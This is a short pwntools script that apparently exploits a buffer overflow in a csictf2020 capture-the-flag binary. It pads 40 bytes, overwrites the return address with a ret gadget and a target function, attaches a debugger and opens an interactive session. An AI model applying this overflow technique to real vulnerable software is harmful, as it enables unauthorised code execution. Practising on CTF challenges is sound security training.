from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/5_csictf2020_pwn0x3/csictf2020_pwn0x3")
pwn.gdb.attach(p)
p.recvuntil(b'Welcome to csictf! Time to teleport again.\n')
payload = b"\x00" * 40
payload += p64(0x40101a) + p64(0x4011de)
payload += b"\n"
p.send(payload)
p.interactive()
